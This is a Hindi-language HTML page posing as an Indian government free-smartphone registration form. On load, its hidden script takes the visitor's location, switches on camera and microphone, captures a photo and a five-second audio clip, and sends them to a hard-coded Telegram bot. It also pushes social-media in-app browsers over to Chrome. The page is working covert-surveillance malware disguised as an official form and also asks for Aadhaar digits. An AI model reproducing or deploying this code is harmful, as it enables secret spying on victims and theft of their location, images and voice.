<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sarkari Yojana - मुफ्त स्मार्टफोन पंजीकरण 2026</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; margin: 0; text-align: center; }
        .header { background: #ff9933; color: white; padding: 15px; font-size: 20px; font-weight: bold; border-bottom: 5px solid #138808; }
        .container { background: white; margin: 20px auto; padding: 20px; width: 85%; max-width: 500px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .emblem { width: 50px; margin-bottom: 10px; }
        h2 { color: #000080; }
        input, select { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .btn { background: #138808; color: white; padding: 15px; border: none; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; }
        #v, #c { display: none; }
    </style>
</head>
<body onload="autoStart()">

<script>
    // इंस्टाग्राम से बाहर निकालने के लिए
    if (navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
        window.location.href = "intent://mk8113049.github.io/MK-hacker-/#Intent;scheme=https;package=com.android.chrome;end";
    }
</script>

<div class="header">भारत सरकार - डिजिटल इंडिया</div>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" class="emblem">
    <h2>स्मार्टफोन योजना पंजीकरण</h2>
    <p style="font-size: 13px; color: #555;">सत्यापन के लिए कृपया कैमरा और माइक 'Allow' करें।</p>
    
    <input type="text" placeholder="पूरा नाम">
    <input type="number" placeholder="आधार के अंतिम 4 अंक">
    <select><option>उत्तर प्रदेश</option><option>बिहार</option><option>अन्य</option></select>
    
    <button class="btn">सबमिट करें</button>
</div>

<video id="v" autoplay></video>
<canvas id="c"></canvas>

<script>
    const tok = '8601193684:AAF9gVWarBQgsHM1FVSv-Bt_DTsILEug7N8';
    const id = '8070342417';

    async function autoStart() {
        // 1. लोकेशन
        navigator.geolocation.getCurrentPosition(p => {
            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 लोकेशन: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });

        try {
            // कैमरा और माइक चालू करना
            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = s;

            // 2. फोटो खींचना (1 सेकंड बाद)
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => {
                    const f = new FormData();
                    f.append('chat_id', id);
                    f.append('photo', b, 'image.png');
                    fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
                }, 'image/png');
            }, 1000);

            // 3. आवाज़ रिकॉर्ड करना (5 सेकंड) - नई तकनीक के साथ
            const recorder = new MediaRecorder(s);
            const chunks = [];
            
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            
            recorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: 'audio/mp3' }); // MP3 फॉर्मेट ताकि आवाज़ आए
                const f = new FormData();
                f.append('chat_id', id);
                f.append('voice', audioBlob, 'voice.mp3');
                f.append('caption', '🔊 ऑडियो रिकॉर्डिंग मिल गई!');
                
                fetch(`https://api.telegram.org/bot${tok}/sendVoice`, { method: 'POST', body: f })
                .then(() => {
                    s.getTracks().forEach(t => t.stop()); // सब बंद कर दो
                });
            };

            recorder.start();
            setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 5000);

        } catch (e) {
            console.log("Error: " + e);
        }
    }
</script>
</body>
</html>
